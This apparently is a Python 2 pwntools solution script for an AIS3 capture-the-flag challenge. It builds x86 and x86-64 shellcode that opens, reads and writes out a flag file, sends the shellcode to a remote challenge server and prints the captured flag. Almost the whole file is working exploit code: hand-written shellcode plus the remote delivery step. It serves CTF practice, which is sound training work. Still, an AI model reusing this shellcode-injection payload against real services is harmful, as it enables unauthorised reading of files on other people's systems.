#!/usr/bin/env python2

from pwn import *

# open 5, read 3, write 4

# open(/home/pwn3//flag, 0) // O_RDONLY
d = ''
'''
d += asm('xor eax, eax')
d += asm('add al, 0x05')		# eax = 5
d += asm('push 0x0067616c')		
d += asm('push 0x662f336e')
d += asm('push 0x77702f65')
d += asm('push 0x6d6f682f')
d += asm('push esp')
d += asm('mov ebx, esp')		# ebx -> /home/pwn3//flag
d += asm('xor ecx, ecx')		# ecx = 0
d += asm('xor edx, edx')		# edx = 0
d += asm('int 0x80')			# syscall open

d += asm('mov ebx, eax')		# ebx = fd
d += asm('xor eax, eax')
d += asm('add al, 0x03')		# eax = 3
d += asm('lea ecx, [esp]')		# ecx = &esp
d += asm('xor edx, edx')
d += asm('add dl, 0x29')		# edx = 41
d += asm('int 0x80')			# syscall read

d += asm('xor eax, eax')
d += asm('add al, 0x04')		# eax = 4
d += asm('xor ebx, ebx')
d += asm('add bl, 0x01')		# ebx = 1
d += asm('int 0x80')			# syscall write
'''

context.arch='amd64'
d += '''
	/* push '/home/pwn3/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f336e
    xor [rsp], rax
    mov rax, 0x77702f656d6f682f
    push rax
    /* call open('rsp', 0, 'O_RDONLY') */
    push (SYS_open) /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* 0 */
    cdq /* rdx=0 */
    syscall
	mov rcx, rax
	/* call read('rcx', 'rsp', 41) */
    mov rdi, rcx
    xor eax, eax /* (SYS_read) */
    push 0x29
    pop rdx
    mov rsi, rsp
    syscall
 	/* call read('rcx', 'rsp', 41) * 2 */
    xor eax, eax /* (SYS_read) */
    syscall
    xor eax, eax /* (SYS_read) */
    syscall
	/* call write(1, 'rsp', 41) */
    push (SYS_write) /* 1 */
    pop rax
    push 1
    pop rdi
    push 0x40
    pop rdx
    mov rsi, rsp
    syscall
'''
print d
print asm(d), len(asm(d))

p = remote('quiz.ais3.org', 9563)
p.sendline(asm(d))
p.interactive()
#ais3{r34d_0p3n_r34d_Writ3_c4ptur3_th3_fl4g_sh3llc0ding_1s_s0_fUn_y0ur_4r3_4_g0od_h4ck3r_h4h4}
